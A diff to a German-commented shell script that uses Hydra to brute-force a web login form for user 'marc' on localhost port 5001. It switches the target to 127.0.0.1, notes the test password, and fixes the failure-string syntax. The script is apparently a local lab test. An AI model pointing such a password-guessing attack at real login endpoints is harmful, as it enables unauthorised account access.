@@ -9,10 +9,10 @@
 # ============================================
 
 # Konfiguration
-# Automatisch die Windows-IP aus WSL ermitteln
-TARGET=$(ip route | grep default | awk '{print $3}')
+# Für macOS: Localhost verwenden (für WSL/Linux war es: ip route | grep default | awk '{print $3}')
+TARGET="127.0.0.1"
 PORT="5001"
-USERNAME="marc"                    # Zu testender Benutzername
+USERNAME="marc"                 # Zu testender Benutzername (Passwort: 12345)
 PASSWORD_FILE="passwords.txt"       # Passwortliste
 
 # Login-Endpunkt und Parameter
@@ -40,9 +40,9 @@ hydra -l "${USERNAME}" \
       -t 8 \
       -V \
       -f \
-      "${TARGET}" \
       -s "${PORT}" \
-      http-post-form "${LOGIN_PATH}:username=^USER^&password=^PASS^:${FAIL_STRING}"
+      "${TARGET}" \
+      http-post-form "${LOGIN_PATH}:username=^USER^&password=^PASS^:F=${FAIL_STRING}"
 
 echo ""
 echo "========================================"
